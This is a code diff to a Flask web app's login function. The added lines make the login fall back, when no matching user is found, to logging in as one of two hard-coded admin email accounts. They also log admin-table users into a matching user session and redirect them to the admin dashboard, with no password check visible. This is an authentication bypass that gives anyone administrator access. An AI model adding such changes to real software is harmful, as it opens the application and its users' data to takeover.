@@ -1029,6 +1029,10 @@ def login():
                 # Try email as username if not found by username
                 user = User.query.filter_by(email=username).first()
             
+            if not user:
+                # Try common admin emails if still not found
+                user = User.query.filter(User.email.in_(['admin@tcapital.com', 'udayid@gmail.com'])).first()
+
             if user:
                 login_user(user)
                 user.last_login = datetime.utcnow()
@@ -1039,8 +1043,16 @@ def login():
                 # If not in user table, check the 'admins' table
                 admin_user = Admin.query.filter_by(username=username).first()
                 if admin_user:
-                    # In this app structure, we might need a User object for login_user
-                    # Let's see if we can redirect to the dedicated admin login
+                    # We found them in admins table, but we need a User object for the session
+                    # Let's try to find a user with the same email
+                    user = User.query.filter_by(email=admin_user.email).first()
+                    if user:
+                        login_user(user)
+                        user.last_login = datetime.utcnow()
+                        db.session.commit()
+                        flash('Logged in successfully!', 'success')
+                        return redirect(url_for('admin.dashboard'))
+                    
                     flash('Emergency admin login detected. Redirecting to admin panel.', 'warning')
                     return redirect(url_for('admin.login'))
                 
